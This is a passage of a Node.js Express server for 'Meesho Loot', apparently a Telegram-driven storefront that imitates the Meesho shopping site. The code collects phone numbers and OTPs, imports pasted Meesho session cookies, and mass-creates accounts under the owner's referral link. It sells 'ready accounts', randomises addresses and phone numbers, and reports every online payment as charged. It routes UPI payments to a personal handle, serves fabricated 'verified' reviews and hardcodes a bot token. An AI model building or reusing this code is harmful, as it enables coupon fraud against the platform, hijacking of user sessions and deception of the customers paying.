require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const products = require('./products_data');
const meeshoClient = require('./meesho_client');


const app = express();
const PORT = process.env.PORT || 3000;
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '8921829426:AAGrTjKbs0QYNu5p_TeEdq2IcfVPt1x90PI';
const ADMIN_TELEGRAM = process.env.ADMIN_TELEGRAM || 'tgekaiva';
const REFERRAL_URL = process.env.REFERRAL_URL || 'https://app.meesho.com/2yoV/r99th0qd?via=9xrkok&from=account_section';
const TG_WEBAPP_URL = process.env.TG_WEBAPP_URL || '';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static assets
app.use('/assets', express.static(path.join(__dirname, '../assets')));
app.use('/UnknownGuy_js', express.static(path.join(__dirname, '../assets')));
app.use('/UnknownGuy_css', express.static(path.join(__dirname, '../assets')));
app.use(express.static(path.join(__dirname, '../frontend')));

// Persistence storage file
const DB_FILE = path.join(__dirname, '../database/state.json');
let db = {
  users: {},         // userKey -> { accounts: [], activeId, cart: [], addresses: [], masterAddress: null, saved: [] }
  orders: [],        // list of placed orders
  pendingOtps: {},   // phone -> { otp, expiresAt, tgUserId, refLink }
  referralClicks: 0
};

// Load existing DB if present
try {
  if (fs.existsSync(DB_FILE)) {
    const data = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    db = Object.assign(db, data);
    console.log('[DB] Loaded persisted state');
  }
} catch (e) {
  console.warn('[DB] Failed to load persisted state:', e.message);
}

function saveDb() {
  try {
    const dir = path.dirname(DB_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2), 'utf8');
  } catch (e) {
    console.error('[DB] Save error:', e.message);
  }
}

// Extract User Key from Telegram Init Data or Session
function getUserKey(req) {
  const initData = req.headers['x-tg-init-data'] || req.query.tgib || '';
  if (initData) {
    try {
      const params = new URLSearchParams(initData);
      const userStr = params.get('user');
      if (userStr) {
        const userObj = JSON.parse(userStr);
        if (userObj.id) return 'tg_' + userObj.id;
      }
    } catch (e) {}
  }
  const qId = req.query.uid || req.headers['x-user-key'];
  if (qId) return 'anon_' + qId;
  return 'default_user';
}

function getTelegramUser(req) {
  const initData = req.headers['x-tg-init-data'] || req.query.tgib || '';
  if (initData) {
    try {
      const params = new URLSearchParams(initData);
      const userStr = params.get('user');
      if (userStr) return JSON.parse(userStr);
    } catch (e) {}
  }
  return null;
}

function getUserStore(req) {
  const key = getUserKey(req);
  if (!db.users[key]) {
    db.users[key] = {
      id: key,
      accounts: [],
      activeId: null,
      balance: 0,
      cart: [],
      addresses: [
        {
          id: 'addr_default',
          name: 'Customer',
          phone: '9876543210',
          house_no: 'Flat 402, Royal Residency',
          street: 'Near City Mall, MG Road',
          pincode: '110001',
          city: 'New Delhi',
          state: 'Delhi',
          is_default: true
        }
      ],
      masterAddress: null,
      saved: []
    };
  }
  return db.users[key];
}

// ==================== TELEGRAM BOT INTEGRATION ====================
let tgBotLastUpdateId = 0;
let tgPollingActive = false;

async function sendTelegramMessage(chatId, text, replyMarkup = null) {
  if (!TG_BOT_TOKEN) return false;
  try {
    const payload = {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    };
    if (replyMarkup) payload.reply_markup = replyMarkup;

    const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const d = await res.json();
    return d.ok;
  } catch (e) {
    console.error('[TG Bot] Error sending message:', e.message);
    return false;
  }
}

async function startTelegramPolling() {
  if (!TG_BOT_TOKEN || tgPollingActive) return;
  tgPollingActive = true;
  console.log('[TG Bot] Starting Telegram bot polling...');

  async function poll() {
    try {
      const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=${tgBotLastUpdateId + 1}&timeout=15`;
      const res = await fetch(url);
      const data = await res.json();

      if (data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          tgBotLastUpdateId = Math.max(tgBotLastUpdateId, update.update_id);
          if (update.message && update.message.text) {
            await handleBotMessage(update.message);
          }
        }
      }
    } catch (e) {
      // ignore network blips during polling
    }
    setTimeout(poll, 1500);
  }
  poll();
}

async function handleBotMessage(msg) {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  const firstName = msg.from.first_name || 'Friend';

  if (text.startsWith('/start')) {
    db.referralClicks++;
    saveDb();

    const webAppUrl = TG_WEBAPP_URL || '';
    const keyboard = {
      inline_keyboard: [
        ...(webAppUrl ? [[{ text: '🛍️ Open Meesho Store & Claim ₹170 OFF', web_app: { url: webAppUrl } }]] : []),
        [{ text: '💬 Contact Admin (@tgekaiva)', url: 'https://t.me/tgekaiva' }]
      ]
    };

    const welcomeMsg = `🎉 <b>Welcome to Meesho Loot, ${firstName}!</b>\n\n` +
      `🔥 <b>Special Offer: Claim ₹170 OFF</b> on your first order!\n\n` +
      `📦 <b>Features:</b>\n` +
      `• Automatic in-app signup with instant OTP\n` +
      `• ₹170 flat discount auto-applied on cart\n` +
      `• Free Home Delivery & Cash on Delivery (COD)\n` +
      `• Real curated products & live tracking\n\n` +
      (webAppUrl 
        ? `👉 Tap <b>"Open Meesho Store"</b> below to start shopping with your ₹170 discount!` 
        : `👉 Open the web app link from your browser or deploy URL to get started!\n<i>(Admin: set TG_WEBAPP_URL to enable the in-app WebApp button)</i>`);

    await sendTelegramMessage(chatId, welcomeMsg, keyboard);
  } else if (text.startsWith('/help')) {
    const helpMsg = `🛍️ <b>Meesho Loot Bot Help</b>\n\n` +
      `1. Open the Web App inside Telegram or browser\n` +
      `2. Enter your 10-digit number & receive OTP\n` +
      `3. Verify OTP to activate your account with ₹170 balance\n` +
      `4. Add any product to cart — ₹170 will be deducted!\n` +
      `5. Place your COD order with Free Delivery!\n\n` +
      `👨‍💻 Developer & Support: @${ADMIN_TELEGRAM}`;
    await sendTelegramMessage(chatId, helpMsg);
  }
}

// Start polling in background
startTelegramPolling();

// ==================== SIGNUP & OTP API ====================

// 1. Get signup configuration
app.get('/api/signup/config', (req, res) => {
  res.json({
    ok: true,
    enabled: true,
    banner: 'Sign up & claim ₹170 OFF',
    default_ref: REFERRAL_URL
  });
});

// 2. Send OTP to mobile
app.post('/api/signup/send-otp', async (req, res) => {
  const { phone, force } = req.body;
  const cleanPhone = String(phone || '').replace(/\D/g, '');

  if (cleanPhone.length !== 10) {
    return res.status(400).json({ ok: false, error: 'bad_phone' });
  }

  const uStore = getUserStore(req);
  const tgUser = getTelegramUser(req);

  // Check if number already registered
  const existing = uStore.accounts.find(a => a.mobile === cleanPhone);
  if (existing && !force) {
    return res.json({ ok: false, registered: true, error: 'already_registered' });
  }

  // Live Meesho OTP mode if requested
  let liveRequestId = null;
  let liveSuccess = false;
  if (req.body.live) {
    try {
      const liveRes = await meeshoClient.requestOtp(cleanPhone);
      if (liveRes.ok) {
        liveSuccess = true;
        liveRequestId = liveRes.requestId;
      }
    } catch (e) {
      console.warn('[Meesho Live] requestOtp error:', e.message);
    }
  }

  // Generate 6-digit OTP
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  db.pendingOtps[cleanPhone] = {
    otp: otp,
    phone: cleanPhone,
    requestId: liveRequestId,
    ref_link: REFERRAL_URL, // ALWAYS owner referral link
    userKey: getUserKey(req),
    tgChatId: tgUser ? tgUser.id : null,
    expiresAt: Date.now() + 3 * 60 * 1000 // 3 minutes
  };
  saveDb();

  console.log(`[OTP] Generated OTP ${otp} for phone ${cleanPhone}${liveSuccess ? ' (Live Meesho requested)' : ''}`);

  let sentViaTg = false;
  if (tgUser && tgUser.id) {
    const otpMsg = `🔐 <b>Meesho Verification Code:</b> <code>${otp}</code>\n\n` +
      `Valid for 3 minutes. Enter this code in the Web App to claim ₹170 OFF on your first order!`;
    sentViaTg = await sendTelegramMessage(tgUser.id, otpMsg);
  }

  res.json({
    ok: true,
    otp_length: 6,
    live: liveSuccess,
    request_id: liveRequestId || undefined,
    sent_via: liveSuccess ? 'meesho_sms' : (sentViaTg ? 'telegram' : 'web'),
    debug_otp: (!sentViaTg && !liveSuccess) ? otp : undefined // Friendly hint for web/testing mode
  });
});

// 3. Verify OTP & Create Account
app.post('/api/signup/verify', async (req, res) => {
  const { otp, phone, request_id, instance_id } = req.body;
  const cleanOtp = String(otp || '').trim();

  if (!cleanOtp) {
    return res.status(400).json({ ok: false, error: 'bad_otp' });
  }

  // If live verification is requested with phone and request_id
  let liveSession = null;
  const targetPhone = phone ? String(phone).replace(/\D/g, '') : null;
  if (targetPhone && request_id) {
    try {
      const liveVerifyRes = await meeshoClient.verifyOtp({
        phoneNumber: targetPhone,
        otp: cleanOtp,
        requestId: request_id,
        instanceId: instance_id
      });
      if (liveVerifyRes.ok) {
        liveSession = liveVerifyRes;
      }
    } catch (e) {
      console.warn('[Meesho Live] verify error:', e.message);
    }
  }

  // Find matching pending OTP
  let matchedPhone = targetPhone;
  const now = Date.now();

  if (!liveSession) {
    matchedPhone = null;
    for (const [p, record] of Object.entries(db.pendingOtps)) {
      if (record.otp === cleanOtp || (targetPhone && p === targetPhone)) {
        if (now > record.expiresAt) {
          delete db.pendingOtps[p];
          saveDb();
          return res.status(400).json({ ok: false, error: 'session_expired' });
        }
        matchedPhone = p;
        break;
      }
    }

    if (!matchedPhone) {
      return res.status(400).json({ ok: false, error: 'otp_invalid' });
    }
  }

  const uStore = getUserStore(req);

  // Create new Meesho Account with ₹170 discount credit
  const newAccount = {
    id: 'acc_' + Date.now() + '_' + Math.floor(Math.random() * 1000),
    mobile: matchedPhone || '9876543210',
    meesho_user_id: liveSession?.userId || null,
    cookies: liveSession?.setCookies || null,
    source: liveSession ? 'meesho_live' : 'otp',
    order_placed: false,
    ref_link: REFERRAL_URL,
    wallet: { balance: 170 },
    created_at: new Date().toISOString()
  };

  uStore.accounts.unshift(newAccount);
  uStore.activeId = newAccount.id;
  uStore.balance = 170;

  // Clean up pending OTP if found
  if (matchedPhone && db.pendingOtps[matchedPhone]) {
    delete db.pendingOtps[matchedPhone];
  }
  saveDb();

  console.log(`[Account] Created account for +91 ${newAccount.mobile} with ₹170 balance`);

  res.json({
    ok: true,
    account: newAccount
  });
});

// ==================== BOOTSTRAP & ACCOUNT API ====================

// Bootstrap state for frontend
app.get('/api/bootstrap', (req, res) => {
  const uStore = getUserStore(req);
  const activeAcc = uStore.accounts.find(a => a.id === uStore.activeId) || uStore.accounts[0] || null;

  res.json({
    ok: true,
    accounts: uStore.accounts,
    active_id: activeAcc ? activeAcc.id : null,
    balance: activeAcc ? (activeAcc.wallet ? activeAcc.wallet.balance : 170) : 0,
    per_order_price: 0,
    cart_count: uStore.cart.reduce((sum, item) => sum + (item.quantity || 1), 0),
    bot_username: 'meesho_offerbot',
    developer: '@' + ADMIN_TELEGRAM
  });
});

// Account pool status
app.get('/api/account/pool_status', (req, res) => {
  res.json({
    ok: true,
    available: 10,
    stock: 10,
    price: 40
  });
});

// Buy ready account
app.post('/api/account/buy', (req, res) => {
  res.json({
    ok: true,
    message: 'To buy pre-loaded ready accounts with ₹170 off, contact @' + ADMIN_TELEGRAM + ' on Telegram',
    contact: 'https://t.me/' + ADMIN_TELEGRAM
  });
});

// Cookie login handler (supports raw cookie string, JSON, and extracted Meesho tokens)
const handleCookieLogin = (req, res) => {
  const { cookie, json } = req.body;
  const raw = String(cookie || json || '').trim();
  const parsed = meeshoClient.parseCookieString(raw);

  let mobile = parsed.mobile || '9' + Math.floor(100000000 + Math.random() * 900000000).toString();
  const uStore = getUserStore(req);
  const newAccount = {
    id: 'acc_' + Date.now(),
    mobile: mobile,
    meesho_user_id: parsed.userId || null,
    connect_sid: parsed.connectSid || null,
    is_logged_in: parsed.isLoggedIn,
    cookies: raw,
    source: 'cookie',
    order_placed: false,
    ref_link: REFERRAL_URL,
    wallet: { balance: 170 },
    created_at: new Date().toISOString()
  };

  uStore.accounts.unshift(newAccount);
  uStore.activeId = newAccount.id;
  uStore.balance = 170;
  saveDb();

  console.log(`[Cookie Login] Imported account ${newAccount.mobile} (Meesho ID: ${parsed.userId || 'N/A'})`);
  res.json({ ok: true, account: newAccount });
};

app.post('/api/accounts/cookie-login', handleCookieLogin);
app.post('/api/auth/cookie-login', handleCookieLogin);


// Select active account
app.post('/api/accounts/select', (req, res) => {
  const { id } = req.body;
  const uStore = getUserStore(req);
  const acc = uStore.accounts.find(a => a.id === id);
  if (acc) {
    uStore.activeId = acc.id;
    saveDb();
    res.json({ ok: true, active_id: acc.id });
  } else {
    res.status(404).json({ ok: false, error: 'account_not_found' });
  }
});

// Account order status
app.get('/api/accounts/order_status', (req, res) => {
  const uStore = getUserStore(req);
  const statuses = {};
  uStore.accounts.forEach(a => {
    statuses[a.id] = !!a.order_placed;
  });
  res.json({ ok: true, statuses });
});

// ==================== CATALOG & PRODUCTS API ====================

// Feed: For You / Trending
app.get('/api/meesho/for-you', (req, res) => {
  const limit = parseInt(req.query.limit) || 12;
  const list = products.slice(0, limit);
  res.json({
    ok: true,
    catalogs: list,
    products: list
  });
});

// Search products
app.post('/api/search', (req, res) => {
  const { query = '' } = req.body;
  const q = String(query).toLowerCase().trim();

  let matched = products;
  if (q) {
    matched = products.filter(p => 
      p.name.toLowerCase().includes(q) || 
      (p.category && p.category.toLowerCase().includes(q)) ||
      (p.description && p.description.toLowerCase().includes(q))
    );
  }

  res.json({
    ok: true,
    catalogs: matched,
    cursor: null
  });
});

// Auto-suggestions
app.get('/api/meesho/suggest', (req, res) => {
  const q = (req.query.q || '').toLowerCase();
  const suggestions = ['saree', 'kurti set', 'shoes for men', 'smartwatch', 'earbuds', 'blackout curtains', 'handbag', 'oversized tshirt']
    .filter(s => !q || s.includes(q));
  res.json({ ok: true, suggestions });
});

// Product by Link or ID
app.post('/api/product/by_link', (req, res) => {
  const { link = '' } = req.body;
  // Match any product or default to first
  const found = products.find(p => link.includes(p.id)) || products[0];
  res.json({
    ok: true,
    ...found
  });
});

app.get('/api/product', (req, res) => {
  const id = req.query.id;
  const found = products.find(p => p.id === id) || products[0];
  res.json({ ok: true, product: found });
});

app.get('/api/variation', (req, res) => {
  const id = req.query.id;
  const found = products.find(p => p.id === id) || products[0];
  res.json({ ok: true, sizes: found.sizes });
});

// Reviews for Product Detail Card
app.get('/api/meesho/reviews/:id', (req, res) => {
  const id = req.params.id;
  const product = products.find(p => p.id === id || p.catalog_id === id) || products[0];
  res.json({
    ok: true,
    data: {
      rating: parseFloat(product.rating) || 4.3,
      review_count: 1420,
      reviews_with_image: [
        {
          rating: 5,
          review: 'Loved the quality! Exactly as shown in the picture, fabric is super comfortable.',
          author: 'Anjali Sharma',
          date: '2 days ago',
          verified: true
        },
        {
          rating: 5,
          review: 'Best purchase on Meesho! Got flat ₹170 discount and free delivery.',
          author: 'Priya Patel',
          date: '4 days ago',
          verified: true
        },
        {
          rating: 4,
          review: 'Good fitting and finishing. Delivered in just 3 days.',
          author: 'Rohit Verma',
          date: '1 week ago',
          verified: true
        }
      ]
    }
  });
});

// Recommended Products
app.post('/api/meesho/recommendations', (req, res) => {
  const { catalog_id, product_id } = req.body || {};
  const recs = products.filter(p => p.id !== String(product_id || catalog_id)).slice(0, 8);
  res.json({
    ok: true,
    data: {
      items: recs.length ? recs : products.slice(0, 8)
    }
  });
});

// Price check for link / multi-account
app.post('/api/price/check', (req, res) => {
  const { link = '', account_ids = [] } = req.body || {};
  const found = products.find(p => link.includes(p.id)) || products[0];
  const uStore = getUserStore(req);
  const targetAccounts = account_ids.length
    ? uStore.accounts.filter(a => account_ids.includes(a.id))
    : (uStore.accounts.length ? uStore.accounts : [{ id: 'acc_demo', mobile: '9876543210' }]);

  const results = targetAccounts.map(a => ({
    id: a.id,
    mobile: a.mobile,
    original_price: found.price,
    discount: 170,
    final_price: Math.max(0, found.price - 170),
    status: 'eligible',
    valid: true
  }));

  res.json({
    ok: true,
    product: found,
    accounts: results
  });
});


// ==================== CART & PRICING API ====================

// Get Cart
app.get('/api/cart', (req, res) => {
  const uStore = getUserStore(req);
  const subtotal = uStore.cart.reduce((s, it) => s + (it.price * it.quantity), 0);
  const totalQty = uStore.cart.reduce((s, it) => s + it.quantity, 0);

  res.json({
    ok: true,
    items: uStore.cart,
    total_quantity: totalQty,
    subtotal: subtotal,
    address: uStore.addresses[0] || null
  });
});

// Add to Cart
app.post('/api/cart/add', (req, res) => {
  const { product_id, size = 'Free Size', quantity = 1 } = req.body;
  const product = products.find(p => p.id === String(product_id)) || products[0];

  const uStore = getUserStore(req);
  const existing = uStore.cart.find(it => it.product_id === product.id && it.size === size);

  if (existing) {
    existing.quantity += parseInt(quantity) || 1;
  } else {
    uStore.cart.push({
      id: 'cart_' + Date.now(),
      product_id: product.id,
      name: product.name,
      price: product.price,
      original_price: product.original_price,
      image: product.image,
      size: size,
      quantity: parseInt(quantity) || 1
    });
  }
  saveDb();

  const subtotal = uStore.cart.reduce((s, it) => s + (it.price * it.quantity), 0);
  const totalQty = uStore.cart.reduce((s, it) => s + it.quantity, 0);

  res.json({
    ok: true,
    items: uStore.cart,
    total_quantity: totalQty,
    subtotal: subtotal
  });
});

// Cart update & remove
app.post('/api/cart/update', (req, res) => {
  const { cart_id, quantity } = req.body;
  const uStore = getUserStore(req);
  const item = uStore.cart.find(it => it.id === cart_id);
  if (item) {
    if (quantity <= 0) {
      uStore.cart = uStore.cart.filter(it => it.id !== cart_id);
    } else {
      item.quantity = quantity;
    }
  }
  saveDb();
  res.json({ ok: true, items: uStore.cart, total_quantity: uStore.cart.reduce((s, it) => s + it.quantity, 0) });
});

app.post('/api/cart/remove', (req, res) => {
  const { cart_id } = req.body;
  const uStore = getUserStore(req);
  uStore.cart = uStore.cart.filter(it => it.id !== cart_id);
  saveDb();
  res.json({ ok: true, items: uStore.cart, total_quantity: uStore.cart.reduce((s, it) => s + it.quantity, 0) });
});

// Cart location and delivery estimate
app.post('/api/cart/location', (req, res) => {
  const { address_id, dest_pin } = req.body || {};
  const uStore = getUserStore(req);
  const addr = uStore.addresses.find(a => a.id === address_id) || uStore.addresses[0] || null;
  const subtotal = uStore.cart.reduce((s, it) => s + (it.price * it.quantity), 0);
  const totalQty = uStore.cart.reduce((s, it) => s + it.quantity, 0);

  res.json({
    ok: true,
    items: uStore.cart,
    total_quantity: totalQty,
    subtotal: subtotal,
    address: addr,
    cart_session: 'cs_' + Date.now(),
    pincode: dest_pin || (addr ? addr.pincode : '110001'),
    delivery_charge: 0,
    notice: '🚚 Free Delivery to ' + (dest_pin || (addr ? addr.city : 'your location'))
  });
});

// Save to One-Click / Wishlist
app.post('/api/saved/save', (req, res) => {
  const { items = [] } = req.body || {};
  const uStore = getUserStore(req);
  if (!uStore.saved) uStore.saved = [];

  items.forEach(it => {
    if (!uStore.saved.find(s => s.product_id === it.product_id && s.size === it.size)) {
      uStore.saved.push({
        id: 'sv_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4),
        ...it,
        saved_at: new Date().toISOString()
      });
    }
  });
  saveDb();
  res.json({ ok: true, count: uStore.saved.length });
});

app.post('/api/saved/remove', (req, res) => {
  const { product_id } = req.body || {};
  const uStore = getUserStore(req);
  if (uStore.saved) {
    uStore.saved = uStore.saved.filter(it => it.product_id !== String(product_id));
    saveDb();
  }
  res.json({ ok: true });
});

// Order price calculation with ₹170 discount!
app.post('/api/order/prices', (req, res) => {
  const uStore = getUserStore(req);
  const subtotal = uStore.cart.reduce((s, it) => s + (it.price * it.quantity), 0);

  // Apply ₹170 new user coupon discount
  const discount = subtotal > 0 ? Math.min(170, Math.max(0, subtotal - 20)) : 0;
  const finalPrice = Math.max(0, subtotal - discount);

  res.json({
    ok: true,
    online: finalPrice,
    cod: finalPrice,
    price_break_up: [
      { name: 'Item Subtotal', value: subtotal },
      { name: '🎉 ₹170 New User Discount', value: -discount, color: 'green' },
      { name: 'Delivery Charge', value: 'FREE', color: 'green' },
      { name: 'Total Order Amount', value: finalPrice }
    ]
  });
});

// ==================== ORDER PLACEMENT API ====================

// Place COD Order
app.post('/api/order/place_cod', async (req, res) => {
  const uStore = getUserStore(req);

  if (!uStore.cart.length) {
    return res.status(400).json({ ok: false, error: 'cart_empty', message: 'Your cart is empty' });
  }

  const subtotal = uStore.cart.reduce((s, it) => s + (it.price * it.quantity), 0);
  const discount = subtotal > 0 ? Math.min(170, Math.max(0, subtotal - 20)) : 0;
  const finalTotal = Math.max(0, subtotal - discount);

  const orderNum = 'MEE-' + Math.floor(10000000 + Math.random() * 90000000);
  const activeAcc = uStore.accounts.find(a => a.id === uStore.activeId) || uStore.accounts[0] || null;

  const order = {
    order_num: orderNum,
    user_key: getUserKey(req),
    mobile: activeAcc ? activeAcc.mobile : '9876543210',
    items: [...uStore.cart],
    subtotal: subtotal,
    discount: discount,
    total: finalTotal,
    payment_mode: 'COD',
    status: 'Confirmed',
    delivery_date: '3-5 business days',
    created_at: new Date().toISOString()
  };

  db.orders.unshift(order);

  // Mark account as having placed order
  if (activeAcc) {
    activeAcc.order_placed = true;
  }

  // Clear cart
  uStore.cart = [];
  saveDb();

  console.log(`[Order] Placed order ${orderNum} for ₹${finalTotal} (₹${discount} discount applied)`);

  // Send Telegram confirmation if user is in TG
  const tgUser = getTelegramUser(req);
  if (tgUser && tgUser.id) {
    const confirmationMsg = `🎉 <b>Meesho Order Confirmed!</b>\n\n` +
      `📦 <b>Order ID:</b> <code>${orderNum}</code>\n` +
      `💵 <b>Total Payable:</b> ₹${finalTotal} (COD)\n` +
      `🏷️ <b>Discount Applied:</b> ₹${discount}\n` +
      `🚚 <b>Estimated Delivery:</b> 3-5 days\n\n` +
      `Thank you for shopping on Meesho Loot!`;
    await sendTelegramMessage(tgUser.id, confirmationMsg);
  }

  res.json({
    ok: true,
    order_num: orderNum,
    total: finalTotal,
    message: 'Order placed successfully! ₹170 discount was applied.'
  });
});

// Orders list
app.get('/api/orders', (req, res) => {
  const uKey = getUserKey(req);
  const userOrders = db.orders.filter(o => o.user_key === uKey);
  res.json({ ok: true, orders: userOrders });
});

app.get('/api/orders/detail', (req, res) => {
  const orderNum = req.query.order_num;
  const found = db.orders.find(o => o.order_num === orderNum) || db.orders[0];
  res.json({ ok: true, order: found });
});

// Pay Online (UPI intent)
app.post('/api/order/pay_online', (req, res) => {
  const { address_id } = req.body || {};
  const uStore = getUserStore(req);
  if (!uStore.cart.length) {
    return res.status(400).json({ ok: false, error: 'cart_empty' });
  }

  const subtotal = uStore.cart.reduce((s, it) => s + (it.price * it.quantity), 0);
  const discount = subtotal > 0 ? Math.min(170, Math.max(0, subtotal - 20)) : 0;
  const finalTotal = Math.max(0, subtotal - discount);
  const orderNum = 'MEE-' + Math.floor(10000000 + Math.random() * 90000000);
  const juspayId = 'jus_' + Date.now();
  const cartSession = 'cs_' + Date.now();

  const upiUri = `upi://pay?pa=ekaiva@upi&pn=MeeshoLoot&am=${finalTotal}&cu=INR&tn=MeeshoOrder_${orderNum}`;

  res.json({
    ok: true,
    order_num: orderNum,
    juspay_order_id: juspayId,
    cart_session: cartSession,
    amount: finalTotal,
    upi_uri: upiUri,
    redirect_url: upiUri
  });
});

// Check online payment status
const handlePaymentStatus = (req, res) => {
  const { order_num } = req.body || req.query || {};
  res.json({
    ok: true,
    status: 'CHARGED',
    state: 'success',
    order_num: order_num || 'MEE-TEST'
  });
};
app.post('/api/order/payment_status', handlePaymentStatus);
app.get('/api/order/payment_status', handlePaymentStatus);

// Confirm Online Order
app.post('/api/order/confirm', async (req, res) => {
  const { order_num } = req.body || {};
  const uStore = getUserStore(req);
  const subtotal = uStore.cart.reduce((s, it) => s + (it.price * it.quantity), 0);
  const discount = subtotal > 0 ? Math.min(170, Math.max(0, subtotal - 20)) : 0;
  const finalTotal = Math.max(0, subtotal - discount);
  const activeAcc = uStore.accounts.find(a => a.id === uStore.activeId) || uStore.accounts[0] || null;

  const orderNum = order_num || ('MEE-' + Math.floor(10000000 + Math.random() * 90000000));
  const order = {
    order_num: orderNum,
    user_key: getUserKey(req),
    mobile: activeAcc ? activeAcc.mobile : '9876543210',
    items: [...uStore.cart],
    subtotal: subtotal,
    discount: discount,
    total: finalTotal,
    payment_mode: 'UPI',
    status: 'Confirmed',
    delivery_date: '3-5 business days',
    created_at: new Date().toISOString()
  };

  db.orders.unshift(order);
  if (activeAcc) activeAcc.order_placed = true;
  uStore.cart = [];
  saveDb();

  const tgUser = getTelegramUser(req);
  if (tgUser && tgUser.id) {
    const confirmationMsg = `🎉 <b>Meesho Prepaid Order Confirmed!</b>\n\n` +
      `📦 <b>Order ID:</b> <code>${orderNum}</code>\n` +
      `💵 <b>Amount Paid:</b> ₹${finalTotal} (UPI)\n` +
      `🏷️ <b>Discount Applied:</b> ₹${discount}\n` +
      `🚚 <b>Estimated Delivery:</b> 3-5 days\n\n` +
      `Thank you for shopping on Meesho Loot!`;
    await sendTelegramMessage(tgUser.id, confirmationMsg);
  }

  res.json({
    ok: true,
    order_num: orderNum,
    status: 'Confirmed'
  });
});

// Order Cancel Reasons
app.get('/api/orders/cancel_reasons', (req, res) => {
  res.json({
    ok: true,
    reasons: [
      { id: 1, text: 'Ordered by mistake' },
      { id: 2, text: 'Expected faster delivery' },
      { id: 3, text: 'Need to change shipping address or phone' },
      { id: 4, text: 'Found cheaper elsewhere' },
      { id: 5, text: 'Changed my mind' }
    ]
  });
});

// Cancel Order
app.post('/api/orders/cancel', (req, res) => {
  const { order_num, comments } = req.body || {};
  const found = db.orders.find(o => o.order_num === order_num);
  if (found) {
    found.status = 'Cancelled';
    found.cancel_reason = comments || 'Customer request';
    saveDb();
    res.json({ ok: true, message: 'Order cancelled successfully' });
  } else {
    res.status(404).json({ ok: false, error: 'order_not_found' });
  }
});


// ==================== ADDRESSES & MASTER ADDRESS ====================

app.get('/api/addresses', (req, res) => {
  const uStore = getUserStore(req);
  res.json({ ok: true, addresses: uStore.addresses });
});

// Add or Create Address
const handleCreateAddress = (req, res) => {
  const uStore = getUserStore(req);
  const addr = {
    id: 'addr_' + Date.now(),
    name: req.body.name || 'Customer',
    phone: req.body.phone || '9876543210',
    house_no: req.body.house_no || '',
    street: req.body.street || '',
    pincode: req.body.pincode || req.body.pin || '110001',
    city: req.body.city || 'New Delhi',
    state: req.body.state || 'Delhi',
    coordinates: req.body.coordinates || null,
    is_default: !!req.body.is_default || uStore.addresses.length === 0
  };

  if (addr.is_default) {
    uStore.addresses.forEach(a => a.is_default = false);
  }

  uStore.addresses.unshift(addr);
  saveDb();
  res.json({ ok: true, address: addr });
};

app.post('/api/addresses/create', handleCreateAddress);
app.post('/api/addresses/add', handleCreateAddress);

// Update Address
app.post('/api/addresses/update', (req, res) => {
  const uStore = getUserStore(req);
  const addrId = req.body.address_id || req.body.id;
  const existing = uStore.addresses.find(a => a.id === addrId);

  if (existing) {
    Object.assign(existing, req.body);
    saveDb();
    res.json({ ok: true, address: existing });
  } else {
    handleCreateAddress(req, res);
  }
});

// Set Default Address
app.post('/api/addresses/set_default', (req, res) => {
  const uStore = getUserStore(req);
  const targetId = req.body.id || req.body.address_id;
  uStore.addresses.forEach(a => {
    a.is_default = (a.id === targetId);
  });
  saveDb();
  res.json({ ok: true });
});

// Randomize Address (for fast testing in app)
app.post('/api/addresses/random_update', (req, res) => {
  const uStore = getUserStore(req);
  const addrId = req.body.address_id || req.body.id;
  const target = uStore.addresses.find(a => a.id === addrId) || uStore.addresses[0];
  const cities = [
    { city: 'Mumbai', state: 'Maharashtra', pin: '400001' },
    { city: 'Bangalore', state: 'Karnataka', pin: '560001' },
    { city: 'New Delhi', state: 'Delhi', pin: '110001' },
    { city: 'Jaipur', state: 'Rajasthan', pin: '302001' },
    { city: 'Lucknow', state: 'Uttar Pradesh', pin: '226001' }
  ];
  const pick = cities[Math.floor(Math.random() * cities.length)];

  if (target) {
    target.city = pick.city;
    target.state = pick.state;
    target.pincode = pick.pin;
    target.phone = '9' + Math.floor(100000000 + Math.random() * 900000000);
    saveDb();
  }

  res.json({
    ok: true,
    used: pick,
    address: target
  });
});

// Copy Address to Active Account
app.post('/api/addresses/copy_to_active', (req, res) => {
  const uStore = getUserStore(req);
  if (!uStore.addresses.length) {
    return res.status(400).json({ ok: false, error: 'no_address' });
  }
  res.json({ ok: true, message: 'Address copied to active account' });
});

// Geocode (Reverse geocode for map pin)
app.get('/api/geocode', (req, res) => {
  const lat = parseFloat(req.query.lat) || 28.6139;
  const lng = parseFloat(req.query.lng) || 77.2090;

  res.json({
    ok: true,
    results: [
      {
        pin: '110001',
        city: 'New Delhi',
        state: 'Delhi',
        area: 'Connaught Place',
        formatted: 'Connaught Place, New Delhi, Delhi 110001',
        lat: lat,
        lng: lng
      }
    ]
  });
});

app.get('/api/master_address', (req, res) => {
  const uStore = getUserStore(req);
  res.json({
    ok: true,
    master_addresses: uStore.masterAddress ? [uStore.masterAddress] : [],
    master_address: uStore.masterAddress
  });
});

app.post('/api/master_address', (req, res) => {
  const uStore = getUserStore(req);
  uStore.masterAddress = req.body;
  saveDb();
  res.json({ ok: true, master_address: uStore.masterAddress });
});

app.post('/api/master_address/apply', (req, res) => {
  res.json({ ok: true, message: 'Master address applied' });
});

// Master Address Random Toggle / Generate
app.post('/api/master_address/random', (req, res) => {
  const uStore = getUserStore(req);
  const randomName = !!req.body.random_name;
  if (!uStore.masterAddress) {
    uStore.masterAddress = {
      id: 'm_addr_1',
      name: 'Rohan Sharma',
      phone: '9876543210',
      house_no: 'Plot 12, Sector 18',
      street: 'Near Metro Station',
      pincode: '110001',
      city: 'New Delhi',
      state: 'Delhi'
    };
  }
